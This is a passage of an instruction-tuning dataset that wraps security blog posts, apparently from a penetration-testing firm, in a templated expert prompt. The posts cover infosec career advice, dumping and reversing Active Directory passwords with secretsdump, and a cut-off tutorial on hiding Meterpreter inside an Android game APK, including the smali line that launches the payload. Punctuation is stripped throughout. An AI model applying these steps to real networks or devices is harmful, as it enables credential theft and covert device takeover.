a lightweight backpacking tripod extension stick and head mount I was in the middle of a good book so I brought my Kindle Oasis along too Two important items that thankfully did not need to be charged were a headlamp and Surefire flashlight spare batteries were in the truck The kids and wife also had flashlights in their bags I also brought my Thinkpad Carbon X1 Hey computer geeks are going to bring computers right It is the lightest computer I have ever owned and claims to have some level of protection against the elements not that I have ever purposely tested that Just in case I had to walk in the soaking rain for any length of time I brought a North Face rain jacket not pictured and LOKSAK bags for the laptop and other electronics I also had a Columbia River Tools pocket knife a knife always comes in handy Lastly I brought two collapsable Platypus 1 liter water containers Even though we had bottled water in a cooler I like these because when empty they weigh very little and are reusable In the end the storm thankfully missed my area and went further south I say that knowing full well that my good fortune meant that someone else did not have the good luck to not get hit by a major hurricane Both the event and the aftermath are terrible experiences to have to go through and I wish everyone affected the best of luck with recovering from it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Career in Information Security: FAQ (Part 1)</title>\n<taxonomies>Informational, InfoSec 101, career path, college, FAQ, Getting into Infosec, getting started, infosec 101</taxonomies>\n<creation_date>Thu, 27 Sep 2018 18:42:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Staff We recently received an email from someone working on their degree who had some questions for whichever tester we could round up They were great questions and since we get asked similar things quite frequently we decided to create a 2-part blog post answering them with the help of several testers See what they had to say about their own journey and don't forget to check out Part 2 on Monday 1 What initially inspired you to pursue your career in information security The only thing more exciting about interdepartmental business processes is breaking interdepartmental business processes and exploiting them Kent Ickler Before specifically being interested in InfoSec I knew from a very young age that I wanted to at least work with computers My family wasn't all that technical regarding computers but we had a few throughout my childhood that really sparked my initial interest We had an Apple IIe that I spent a lot of time trying to figure out I talked my dad into letting me order a Build-Your-Own-Computer kit around the age of ten or so and built it by myself incorrectly but I learned a lot It wasn't until college though that I found out that computer security is what I wanted to pursue I took a course on Ethical Hacking and learned that I could hack companies legally and get paid for it Now that's what I do Beau Bullock My dad inspired me He was a low-level firmware engineer so I grew up in a house where our kitchen table was full of the hardware he was reverse engineering dumping EEPROM's creating binary patches and even backing up my Nintendo games Between the PC just being released and the exposure to the consistent tinkering I quickly adopted a very similar mindset and began trying to figure out how technology worked under the hood Mike Felch I got an email from a person whose signature was a complete RSA implementation in something like four lines of painfully-unclear Perl code The story goes that the US government considered it a munition and illegal to export That got me in three ways First I was surprised that it was possible to do encryption with such a small program Second I could not believe that this block of text that looked like line noise on a bad modem connection was a way to do it I wanted to be able to understand things like that Third I was intrigued by the idea that sharing this bit of text was the legal equivalent of shipping weapons of war I'm not sure if this is the exact one I saw or not but it shows the idea bin perl -sp0777i unpack 'H _ _ echo 16dio U k SK SM n EsN0p lN 1 lK d2 Sa2 d0 Ixp dc s W g _ pack 'H -Brian BB King I really wasn't aware of infosec as an industry or career path until I switched majors to computer science in college I took an introductory infosec course as an elective and I was instantly hooked I knew I wanted to do something in this industry Craig Vincent I stumbled into it also I liked the movie Hackers 1995 The SANS Institute offered my college US Air Force Academy scholarships to spend our spring break taking a SANS course I was a PoliSci major at the time but our CompSci students weren't interested in sacrificing their spring break I was It changed my life -Matt Toussain This is probably the worst answer but I actually pursued technology security because I knew the market was large and there were lots of job opportunities and it paid well A better answer from a security standpoint when I applied for an internship with BHIS I only had a vague idea of what the company did and what red teams were Somewhere in the middle of the interview I began to realize 'Wait these guys hack people and those people pay them for it That's a real job I need to work here -Kelsey Bellew It's hard to pin down exactly It could be learning basic networking while trying to bypass school firewall restrictions in order to play games or watch Youtube accidentally discovering remote connection methods and persistence mechanisms in order to play pranks on friends computers or maybe the lone flyer in a tucked-away corner of college campus that led to a phone call with John where I asked him if incredulously if hacking banks was actually legal Ethan Robish I chose this career as I always enjoyed figuring out how to fix computers and how they worked in high school so thought why not make this my goal Granted I took two years between high school and college to make sure it's what I wanted to do by doing some odd jobs Derrick Rauch I was working in construction from like 1999 to 2004 to get through college and realized how hard it was every day Looking back it was nice to leave my work on the job site but that was where it started One of my roommates was in the CIS program and loved it I jumped HP hired me out of college just about as soon as I graduated in 2005 Tech support front line truly the grind It was the start of four jobs in this field that landed me at BHIS ProTip The customer service tech support help desk etc these jobs are crucial to forming a solid background in computer science Learn how to solve problems effectively Learn how to discern between useful web search results and wastes of time Employers don't want to hire you for what you know I generally believe that anyone some computer background can be trained to accomplish digital tasks I can't train you to manage your time well We can't train people to be nice treat others like human beings or to be steady under pressure And truly those are the skills that will put you at the front of the line It worked for me and everyone else at BHIS too -Jordan Drysdale 2 What would be one important piece of advice for someone who is considering going into this field I don't know if you can start out in IT information security I didn't I've worked hard to get here and consequently have a decent understanding of many different aspects of IT and how businesses actually work Kent Ickler Try Harder is the motto of Offensive Security and it has stuck with me since I was working on the OSCP back in 2011 Both in InfoSec and in life I've found that motto to be an extremely important staple of how I get things done There are many times when you will hit a wall and think something is too difficult and want to give up Just know that there are vastly unexplored territories in computer security that likely contain vulnerabilities that will only be discovered by pushing yourself further Another motto that I live by now is one I learned from Mike Felch ustayready when we were working on the Bomb Defusing challenge at DEF CON in 2017 That motto is Fail Fast Fail Often and Fail Forward When you are working on solving a problem spend more time failing and less time analyzing the problem from a distance Document what you did why it failed and then try something different If that fails too that's okay The key here is to learn from what you did so that you can arrive at a solution sooner I know you only asked for one important piece of advice but here is a third Learn a programming language It will be an extremely useful skill that you will be able to utilize to modify a current tool or write a brand new tool Beau Bullock Be ready to always learn and sometimes be frustrated IT Security is always changing and things that work three weeks ago may not tomorrow Derrick Rauch Don't specialize too soon Develop a broad base of fundamental skills before getting into security Programming networking database management system administration etc If you don't have a solid grounding in the systems and environments you want to secure you'll always be struggling You're going to struggle anyhow but without a good background you'll waste time struggling with the wrong things -Brian BB King Get as much hands-on experience as you can Build some sort of lab or test environment at home Even if you're just practicing exploiting some of the intentionally vulnerable virtual machines that are out there or messing with your own network that experience is super valuable John's 5 year plan webcast has some good examples of things you can do for cheap free at home Craig Vincent Don't worry too much about the degree After I got the bug for hacking I figured computer science was the field to go For me changing majors was a mistake As a fuzzy major I was spending time tinkering with things coding on the side for my own edification As a computer scientist I was given designated assignments to accomplish It sucked the passion and perseverance out of me while simultaneously giving you challenges with known solutions to solve One of the most critical skills in information security is the ability to go off-script There is no better way to learn this than to tinker on your own While a STEM major may provide some value in my experience this pales in comparison to sheer passion proven ability and experience While you are studying take the opportunity to look beyond your degree find and contribute to open source projects tinker Matt Toussain Find some aspect of cybersecurity that really interests you and make a personal project out of it This will teach you so much more than you could just learn in a class and talking about that project makes you an excellent candidate during interviews -Kelsey Bellew I'm going to echo what others have mentioned find a mentor ideally local Go to security conferences if you are able or find local city or college meetups if they exist Find other people in college who are interested in the same thing Try to find a security professional locally try searching LinkedIn Twitter Facebook or conferences and meet up with them Just try to be as likable as you can and respect their time Show your enthusiasm and willingness to learn and help If you already have skills chances are you can find an internship where you can do your utmost to contribute and learn We love interns who are self-driven ask questions and find ways to add value rather than wait for someone to have the time to give them step by step instructions Or if you still have some basics to learn take any advice a mentor can give you take action and then report back after a few months with what you've accomplished learned etc It's a huge compliment to take someone's advice and actually put it into action Not only have you shown you respect that person you have also shown you are self-driven able to learn and that you now have more valuable skills and experiences to bring to the table Ethan Robish I've sold the ranch on this one already but here goes It is okay to take an entry-level job in IT at a help desk for a local ISP for a local firm that provides some form of managed services Desktop technicians become server technicians We hire server techs because they know how to make the world go around Learn about networking I don't mean people networking I mean connecting systems together Learn what layer two is MAC to MAC device communications ARP switches live here Why does ARP matter to layer three communications routers live here Layer four is protocol communication HTTP is port 80 SSL is port 443 So my web server is mac aa bb cc dd ee ff at 10.1.1.10 and is listening on port 80 What does a packet destined for this device look like Truly learning how to communicate with this device from a local device at 10.1.1.20 and what those packets look like verses from my house and routers these fundamentals are so crucial to the functioning of the general internet and business as a whole these days The fundamentals of infosec start with networking -Jordan Drysdale 3 What was the biggest hurdle that you encountered when you were first getting started in information security and how did you overcome it Biggest hurdle I had was the impersonation syndrome It's real I knew a little about a lot of things For a long time I tried to keep up with my co-workers careers Turns out everyone brings something important to the table Working at BHIS is great because we work together share ideas knowledge experiences We all grow and all become better security analysts hackers and humans Kent Ickler The biggest hurdle I encountered was getting an initial role in InfoSec I knew from that Ethical Hacking course in college that's what I wanted to do but didn't have any experience While still in college I got an IT-related job in operations where I basically was in a SOC but mainly just kept things running It wasn't really an InfoSec role though I was able to eventually shadow with the security department at the company I was at to get my feet wet in InfoSec Eventually I applied for a Systems Analyst job at another company but in my interview I spoke a lot about my interests and motivation to work in a computer security role They actually ended up creating a brand new Security Analyst role for me after that interview Beau Bullock The internet was brand new which meant there were very limited resources Understanding deep technical vulnerabilities meant I had to understand the inner-workings of the technology so that I could understand the security problems when they were introduced to me In the late 90's early 00's we would gather on IRC channels and collaborate on discovering new security vulnerabilities then release the details in e-zines It boiled down to having an inquisitive thought-life being surrounded by a group of people smarter than me and always being willing to share regardless if I felt it was share-worthy or not Mike Felch I think having no security experience was probably the biggest hurdle When I had a chance to represent my team a kind of development group on a project being run by the security group at my company I jumped at it I did my best to understand the project's goals and how it would affect my team I asked questions found answers and got to know the person leading the security side After a few weeks of working together I asked him if they were hiring He said they were I applied and made an internal transfer to the security team based not on my security skills but on how I handled that project -Brian BB King I struggled with trying to find a balance between work and life and I finally realized and accepted that one can not know everything in this field and that is okay to focus on what you enjoy in it and don't let life pass you by Derrick Rauch Figuring out what I actually wanted to do was probably the hardest thing When I started looking at getting into infosec it was kind of daunting how broad the field was There were many different paths to get started on and many of them required some very different skills In terms of how I overcame it I guess you can say I brute-forced it because I got it wrong the first time I used to think I wanted to be a malware analyst It wasn't until I had spent hundreds of hours studying developing those skills and playing with malware samples that I realized I really wasn't cut out to be a malware analyst Some things sound like way more fun than they actually are and malware analysis just wasn't for me The best advice I could give to someone starting out is to try different things until they find something they really enjoy Craig Vincent My biggest hurdle was the gaping holes I had in my networking knowledge Most of the testers at BHIS at the time came from very varied backgrounds where they had lots of experience in everything computer related or they had previously worked as network administrators When I first started and coming from a strictly computer science coding background I hardly understood the difference between an internal and external network I overcame this reading a lot of technical articles Wikipedia RFCs getting first-hand experience and asking a lot of questions even when I thought they would make me sound dumb -Kelsey Bellew Going from college to an extremely small consulting business there was very little feedback or direction With college you have grades on every assignment so you know if you did well With work you'll only really ever know if you seriously screwed up If you're very lucky you will know if you did well but most of the time you just have to find your own self-confidence while still staying humble and being receptive to any feedback that may come your way Ethan Robish With my first job solving complex networking problems for enterprise customers at HP it was immaturity I was young did not have a large support network around me It took my manager being one of the best people I've ever met still text to get me headed in the right direction I didn't know how to talk to people look them in the eye I didn't know how to listen either which turned out to be way more important As my life in IT progressed there were lots of other challenges along the way Learning how to balance life right We all need to have healthy habits outside the workplace which was easy in Colorado Hiking biking snow riding all those things Family eventually lack of sleep As pay goes up generally so do responsibilities I carried an after-hours pager for a long while which sucked Bad especially already being tired and getting calls in the middle of the night At BHIS I quickly realized there was something significant missing in my background I have been struggling to write scripts code programs and basically develop functional code since I started here I'm still struggling with this today -Jordan Drysdale A huge thanks to all of our testers who took time out of their busy schedule to help answer these questions"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Career in Information Security: FAQ (Part 2)</title>\n<taxonomies>Informational, InfoSec 101, career path in infosec, FAQ, getting in to infosec, information security, infosec, infosec 101</taxonomies>\n<creation_date>Mon, 01 Oct 2018 14:34:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Staff If you missed part one you can get caught up here www.blackhillsinfosec.com a-career-in-information-security-faq-part-1 Let's jump straight back in to the Q A 4 What are some of the college courses that you took that had a lasting impact on your career Courses in Human Capital Management had the most lasting impacting on my career But I might be the minority on that Human Capital Management is about human knowledge human resources and matching a pay service to a human capable of doing the work Being a Security analysts with that background helps you find vulnerabilities as a result of a knowledge skill gap has become their weakest link Businesses that have invested in Human Capital Management typically cover their IT assets in such a way that the right eyes are looking in the right places at the right time and have a continuity plan for when those eyes get tired Kent Ickler Ethical Hacking was really the primary course I took in college that had a lasting impact on my career Any programming classes I took also had an impact but on a daily basis I use more that I've learned from real-world experience than what college classes taught me In terms of quality educational courses I highly recommend SANS courses though Each SANS course I've taken has been packed with information that I've been able to utilize daily -Beau Bullock Philosophy 105 Logic and Reasoning This covered formal and informal logic syllogisms and fallacies and those sorts of things I took it as an elective for fun but it gave me a solid understanding of how to build an argument and how to recognize cognitive biases and flawed reasoning When I shifted my focus to computers I found boolean logic and truth tables were nice and familiar -Brian BB King Programming was by far one of my most beneficial classes No I'm not saying take nothing but programming classes unless that is your desired field The reason I say this is it teaches fundamentals on how applications work as well as design flow which helps correlate to possible findings of vulns as well as a basis for troubleshooting in a systematic way thinking outside the box Derrick Rauch We had a course called Legal and Ethical Issues in Computing I find myself using concepts and ideas from that class on an almost daily basis Craig Vincent Really none I didn't even take a security class in college -Kelsey Bellew The basics of computer science are pretty universal and good to have a grasp on Discrete Math Data Structures Algorithms Knowing how to program in a couple languages is useful Networking knowledge is crucial but can be self-taught and Operating Systems fundamentals is sometimes handy too Ethan Robish Project Management Microsoft Office bootcamp Java basics Finance I still carry a calculator that can do TimeValueOfMoney Marketing understanding demographics MacroEcon I now take a macro perspective in every situation HTML Spanish I can't emphasize this enough and haven't mentioned that the only reason I got a break at HP was because I could answer a telephone in semi functional Espanol Seriously this coursework and the construction day to day with Mexicans paved my way in to IT No joke Looking back I would have invested in more Computer Science -Jordan Drysdale 5 What are some aspects about your career that you didn't know about or consider when you were starting My career has been a winding path of industry fields all having focused on IT in some fashion Five years ago I didn't know I would be doing this now but I enjoy the work I do and being able to and motivated to give back to the community is amazing Kent Ickler When starting out I didn't really consider how much time would be spent doing reporting I spend a lot of my week with Microsoft Word open writing reports for customers This is the most important piece as it is the deliverable to the person who is paying your company for you to do your job So if you are interested in getting into penetration testing or red teaming just be aware it's not all hacking You will be spending a lot of time typing up reports -Beau Bullock I thought it was a purely technical field It's not Learn to write well You can learn a lot of the technical skills as-you-go but you'll never have as good a chance to learn how to use language as you do in school Practice writing every chance you get -Brian BB King I did not consider the fact that I would have to dedicate so much time to continuing education however this is a double edged sword for me as I love to learn Derrick Rauch Starting out I didn't realized how tightly coupled my technical work was with the business operational aspects of the companies and organizations I worked for I found that considering my role from the business perspective made me more valuable It ultimately made my job much easier and more enjoyable too Craig Vincent I have to deal with people a LOT Any time I thought of a technical job I thought it would mean being in a dark remote cave somewhere and if you interacted with anyone it would be the other people in the cave This isn't true at all in security and I don't think it matters what branch you go into By nature it's a very social job You have to get very good at clearly explaining events and your own point of view if you want to get very far -Kelsey Bellew Before that pivotal phone call with John I didn't know that hacking into things was a legitimate job Afterwards I think what maybe surprised me the most was how much different corporate cultures influenced overall security In general the places with the worst security were the ones who A didn't want us to be there B were forced to consider security by compliance a customer or some other department and C were territorial and either defensive or aggressive towards us and other IT-related departments in their company Ethan Robish I never imagined that my life would be where it is now There couldn't possibly a closer connection from what I do on a daily basis to what is going on in the real world SANS SEC504 Hacker Techniques and Incident Handling this class is what we do on a daily basis and what defenders these days are up against There are breaches every single day We are trying desperately to educate help people businesses and anyone that will listen But trying to step back and answer the question more directly...We all just expect to get out get an awesome job and love our lives The struggle is real Working at HP in a large corporate environment was super tough and got to be more and more stressful I quit after five years a twitchy right eye and a stressed out life Sure money was good but it was hard -Jordan Drysdale 6 What are some things I should be spending my time doing now outside of school to help prepare me for a career in this field Watch all of BHIS's webcasts and follow our crew on Twitter There are lots of IT Security resources around Work on capture-the-flag challenges Start a local meet-up to discuss IT security IT issues or just to have an hour away from school Networking is very important in IT Security because the field is so wide it is not possible to be an expert in all aspects Kent Ickler Learn as much about networking fundamentals as possible Having an understanding of networking before diving into the security aspect of it is very important in my opinion This is a seven hour course from Microsoft with eight modules and eight really short assessments that might be a good starting place va.microsoft.com en-us training-courses networking-fundamentals-8249 Learn the Linux command line It is one of the primary operating systems we use in penetration testing so it will be very good to get a basic understanding of it and how to use the command line Almost everything we do in security is driven from the command line Here are two free courses on Linux and the command line The second one will walk you through setting up Virtual Box and a Linux virtual machine then show you some command line basics ww.codecademy.com learn learn-the-command-line ww.udacity.com course linux-command-line-basics--ud595 In penetration testing we are often attacking other computer systems One very popular tool for doing this is called Metasploit There is a free course that introduces it from Offensive Security called Metasploit Unleashed that is worth checking out ww.offensive-security.com metasploit-unleashed Download the vulnerable virtual machine Metasploitable two from here ownloads.metasploit.com data metasploitable metasploitable-linux-2.0.0.zip and work on attacking it with Metasploit For learning about webapp security the go-to standard is DVWA Damn Vulnerable Web App Set that up and go through some of the exercises A good list of some more vulnerable VM's can be found on this SANS poster ounterhack.net Poster_PenTest_2015.pdf Lastly I highly recommend finding some Capture the Flag contests to participate in as well Those will challenge what you know and force you to learn new things Google has one that is over now but the challenges are still up apturetheflag.withgoogle.com Most Security BSides events have them and I really like NYU Poly's CSAW CTF but there are many others Also SANS keeps up their Holiday Hack Challenges every year so you can go do the previous year's challenges now They are epic and a lot of fun -Beau Bullock Learn how things work and how to fix them By things I mean physical items Replace the kitchen faucet Swap out an old light fixture Take the lawnmower apart and put it back together Develop a hobby or interest that doesn't involve computers Play music On an instrument that involves no digital circuitry Join a recreational sport Take a cooking class Build a bookshelf Find something you enjoy doing that uses a different part of your brain than computering Look for something you can't do sitting in a chair at a desk Develop a skill you can feel good about for your own reasons -Brian BB King Get hands on experience Pick up a job at a help desk or computer sales place or do some moonlighting as a per job gig as you have time to get a broad overview of people's needs as well as what this industry can cover This also helps build social interaction skills as well as hands on experience Even if your job desires lie more in programming or security a good base of fundamentals like this is always helpful Derrick Rauch Go to cons and talk to people Go to your local meetups and talk to people Listen to podcasts Read blogs Get on Twitter and follow the people who are doing what you want to do Play with the stuff you're interested in at home Craig Vincent Contribute to open source projects come up with and solve challenges with code build and administer tons of different systems Hackers break and make things pentesters do too Before you can do either you need to understand how the system application works Make a WordPress blog use Drupal find an old Cisco switch and play around with it To quote Jurassic Park It's a Unix System I know this The more things you can say that about the better prepared you will be If you can demonstrate this to an employer you will never have trouble finding a job Matt Toussain Go learn a coding language if you haven't already I recommend Python Install and run WireShark on your personal computer and just look at the different connections being made Install something like Wappalyzer in your browser to see what services are being run on different websites if only to familiarize yourself with the terminology -Kelsey Bellew Try as many things as you can to find out what you enjoy But the main thing is to contribute to something in a meaningful way Don't just read nonstop and never participate Here are some examples coding hackathons coding competitions capture the flag competitions open source development Google Summer of Code bug bounties CCDC internships Ranking in competitions or making meaningful coding contributions are great things to have on a resume as they show hands-on experience and that you are good at what you do Ethan Robish Learn to code even simple stuff check out CodeCademy They are awesome Your family probably needs your help Learn about better passwords password managers 2factor CAUTION opinions ahead Learn about online privacy read about the electronic frontier foundation Your privacy matters and protecting it also matters Buy a book about a technical subject and instead of playing video games or scrolling read it for 30 minutes a day Find an old computer and learn how to install Linux on it Linux Mint or Ubuntu are awesome Review your personal digital life and make your passwords longer your wifi key could probably use an update Turn on two-factor everywhere you can Help your family do the same -Jordan Drysdale"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How I Cracked a 128-bit Password</title>\n<taxonomies>How-To, Password Cracking, Red Team, Cleartext, Password Cracker, Password cracking, Red Team, Reversible Encryption</taxonomies>\n<creation_date>Thu, 04 Oct 2018 14:32:34 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven TL DR Passwords stored using reversible encryption even if they are VERY LONG can be trivially reversed by an attacker Password cracking is quite enjoyable It is very satisfying to launch Hashcat throw a bunch of hashes at it and watch the progress over minutes which turns into hours and then days It does this all while you are working on another test walking the dog or perhaps sipping cocktails on the beach A password cracker works by taking a potential password say Autumn2018 and calculating its hash Hashcat then compares the newly calculated hash that represents Autumn2018 to the list of hashes you have given it If it finds one or more matches it means those accounts are using the password Autumn2018 Got one Got another ...and so on It all starts with extracting the hashes from a domain controller Most often we elevate to domain admin and logon to a domain controller to get the files needed Psssst Sometimes it is even easier Sometimes there is a backup file accessible by a lower-privileged account that contains the Active Directory AD database Since you cannot copy the active running AD database it is locked while in use we create a VSS snapshot and copy the ntds.dit file along with the SYSTEM registry hive that contains the BOOTKEY needed to extract hashes We typically do this with the built-in ntdsutil command like so Then we can use the Impacket secretsdump Python script to actually pull the hashes from database secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile breakme I am used to seeing the the .NTDS file that contains the NTLM hashes but imagine my surprise when on a recent test the script also output a file with the extension .CLEARTEXT To protect the innocent this was re-created in the lab but this did happen on an actual test The secretsdump script writes all hashes out to files using the prefix breakme as specified by the outputfile parameter In this case it found NTLM hashes cleartext hashes and Kerberos keys As it turns out the CLEARTEXT file contained cleartext passwords for the associated users including several passwords that were literally 128 characters in length For this blog post we of course are zooming in on the CLEARTEXT file I had never seen this before This is the thing of legends There was literally an output file that contained each user account and a corresponding cleartext password No cracking required Of course I immediately spot-checked some of these accounts cough cough a domain admin account to see if the passwords were valid and they were After some investigation I learned that there are at least a couple different mechanisms that force the storage of cleartext credentials Note Cleartext does not really mean that the passwords are stored as is They are stored in an encrypted form using RC4 encryption The key used to both encrypt and decrypt is the SYSKEY which is stored in the registry and can be extracted by a domain admin.This means the hashes can be trivially reversed to the cleartext values hence the term reversible encryption For an account that stores the password using reversible encryption the account properties in Active Directory Users and Computers ADUC may show the box checked for Store password using reversible encryption It looks like this You can use the command line to query AD for any users with the reversible encryption flag set in the UserAccountControl attribute using the following PowerShell command Get-ADUser -Filter 'useraccountcontrol -band 128 -Properties useraccountcontrol Format-Table name samaccountname useraccountcontrol If you want the excruciating detail about the syntax of this command scroll down to the section at the bottom titled In the Weeds Otherwise suffice it to say that the above command will get you all the accounts that have been configured to store passwords using reversible encryption So the big question is why Why would there be a need to store credentials in this manner The answer is that some applications require it So Microsoft has provided a mechanism for applications that need to know user password values to force storage of reversibly-encrypted passwords in order to authenticate users The applications that I know about that require reversible encryption are MS CHAP SASL Digest Authentication older MacOS hosts that need to authenticate to a Windows domain There are also very possibly other third-party apps that use it as well Here is a best-practice tip from Microsoft about this setting ocs.microsoft.com en-us windows security threat-protection security-policy-settings store-passwords-using-reversible-encryption Take Aways Even though it requires a domain administrator to extract hashes from the Active Directory database using the method we have shown above it implies that the DA or a stolen DA account could easily learn other users passwords This violates the principle of non-repudiation which prevents users from disputing activity within an information system We often find backup sets that contain VSS snapshots providing access to the AD database The backup sets are often accessible by lower privileged accounts and perhaps even all domain users In that case any domain user could easily have access to any account password that was stored using reversible encryption In the Weeds I promised some more details on the command syntax shown above As a refresher here is the command to extract users whose passwords are stored using reversible encryption from Active Directory using PowerShell Get-ADUser -Filter 'useraccountcontrol -band 128 -Properties useraccountcontrol Format-Table name samaccountname useraccountcontrol Let's break it down piece by piece Get-ADUser is a cmdlet in the ActiveDirectory PowerShell module that is installed on Windows Server 2008 R2 and later by default It can be imported using the Import-Module command Filter Uses a PowerShell expression to tell the cmdlet what the search parameters are In this case we are searching for user accounts with specific UserAccountControl attribute values more on that in a minute You could also use LDAPFilter in place of Filter It does the same thing as Filter but uses LDAP query syntax The correct syntax for finding the desired UserAccountControl value would be Get-ADUser -LDAPFilter objectCategory Person UserAccountControl 1.2.840.113556.1.4.803 128 -Properties useraccountcontrol Format-Table name samaccountname useraccountcontrol -band 128 The UserAccountControl attribute in Active Directory is an attribute associated with settings for user accounts and is 32 bits in length Each bit represents a specific setting regarding that user account For example when an account is disabled the second low-order bit is set to 1 In the case of reversible encryption it is the 8th low-order bit that would be set to 1 The 8th low-order bit corresponds to the decimal value 128 I told you we were getting into the weeds To access the values for specific bits within this number you have to use logical bit-level operations To learn more about bitwise operations you can look here or here In our example -band 128 means use a bitwise AND operation with the value 128 to determine if the 8th low-order bit is set or not regardless of what other bits are set within the 32-bit number This basically isolates just one bit and allows you to examine it like this If you are using the LDAPFilter the bitwise operation is specified by using the equivalent LDAP syntax for bitwise operations 1.2.840.113556.1.4.803 By specifying the value 128 we are requesting that all records with the 8th low-order bit set to 1 be returned Whew the hard part is over The rest of the command is really just about formatting the output Properties useraccountcontrol Because the Get-ADUser command retrieves a default set of properties that does not include the UserAccountControl attribute you have to explicitly ask for it in the results with the -Properties parameter Format-Table name samaccountname useraccountcontrol The Format-Table command tells PowerShell how you want the output formatted along with which properties to show You could use Format-List instead of Format-Table if you want the results listed vertically instead of in a table Of course you could output it all to a file for further processing Get-ADUser -Filter 'useraccountcontrol -band 128 -Properties useraccountcontrol Format-Table name samaccountname useraccountcontrol Out-File -Encoding ascii MyOutput.txt Bravo You made it to the end Thanks for reading and as always if you have comments or great stories related to this topic let us know"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Embedding Meterpreter in Android APK</title>\n<taxonomies>Author, Joff Thyer, Mobile, Red Team, Android, Android APK, meterpreter, mobile apps, pentest, Red Team</taxonomies>\n<creation_date>Mon, 15 Oct 2018 15:52:40 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Mobile is everywhere these days So many applications in our daily life are being migrated towards a cloud deployment whereby the front end technology is back to the days of thin clients As the pendulum swings yet again our thin client can be anything from a JavaScript browser framework to a mobile-enabled frontend such as Objective-C on Apple iOS or Java-based on Android Looking at malware our friends at Apple continue to maintain the 5-guys in a cave paradigm of attempting to vet all apps that enter the iOS app store While it is a noble effort there are still instances where malware creeps through the door Unlike Apple the Android marketplace is an open approach that allows anyone to contribute to the play store and moreover represents a majority of the mobile market share In addition there are various third-party sites that allow direct download of Android applications package files APK's The Metasploit project allows a pentester to generate Android payloads with a pretty highly functional Meterpreter command channel that can be loaded onto an Android device Typically loading this APK will be through the Android debugger adb through sideloading From a pen tester perspective something that is fun to do is to combine a legitimate perhaps fun app with Meterpreter and sideload that app onto an Android device Naturally you would probably consider sending that device to a friend as a gift or some similar social engineering ruse Android applications are written in Java which compiles down to a Dalvik executable format known as DEX The compiled version of an application is a ZIP file of DEX bytecode files The Dalvik virtual machine on Android has been more recently replaced with Android RunTime ART which performs additional optimization and compiles the DEX bytecode into native assembly code The Dalvik VM primarily performs Just In Time JIT interpretation of the majority of bytecode ART is higher performing than the Dalvik virtual machine which only optimized portions of the bytecode for frequently executed parts of the app Smali baksmali is an assembler disassembler for Android DEX bytecode An Android tool named apktool enables the disassembling of zipped DEX APK files into smali files and reassembling of smali files back to DEX and subsequently to the zipped APK format We can use this tool to disassemble and modify an existing APK file In this context we can use the tool to disassemble and add an additional static entry point into the smali code of the initial Android Activity to kick off our Meterpreter Overall the steps to embed a Meterpreter into an existing APK file are as follows Find an existing fun APK application on apkmonk.com or similar mirror site Generate the Metasploit APK file Disassemble with apktool both the Metasploit APK file and the APK file we are intending to modify Copy all of the Meterpreter smali code over to the new APK smali directory Find the entry point of the code within the APK application's AndroidManifest.xml file by looking for the intent-filter with the line The activity name that encloses this intent-filter will be the entry point you are seeking Modify the activity .smali file to include a line that starts up the Meterpreter stage Copy all of the Meterpreter smali code over to the new APK smali directory Re-assemble into DEX zipped format Sign the newly created APK file with jarsigner and then sideload onto your target Android device It is much easier to understand the above steps with a concrete example To illustrate this I downloaded an APK file of a game called Cowboy Shooting Game from apkmonk.com Generate Your Malware APK I then generated a Metasploit APK using the msfvenom command as follows Disassemble the APK Files Both files were then disassembled baksmaling using the apktool as follows Copy the Malware Code Into the Cowboy Tools Game An easy way to do this is to change directory into the Metasploit APK directory then copy all of the files under the smali directory into the com.CowboyShootingGames_2018-09-22 directory An old trick I learned from a systems administrator to backup entire directory trees using the tar command comes in handy whereby you pipe the output of tar into a second command which changes directory and untars the resulting files Find the Activity EntryPoint Below we can see that the entry activity is listed as com.CowboyShootingGames.MainActivity We know this because the XML contains an intent-filter with android.intent.action.MAIN within it Modify the Activity EntryPoint Smali File As can be seen above in this case the file is going to be named MainActivity.smali and will be located in the com CowboyShootingGames directory as per the periods in the fully qualified classpath Within the MainActivity.smali file we are looking for the onCreate method We need to add a single line of smali code right below the onCreate method call to invoke our Meterpreter stage invoke-static p0 Lcom metasploit stage Payload start Landroid content Context V Please note that the above is a single line of code It is possible to obfuscate by using a different pathname than com metasploit stage Payload however if you do that you will have to modify all references to the path in all of the smali files that are contained in the Payload directory and change the directory name itself This can be done manually but is prone to error Continuing without any obfuscation for 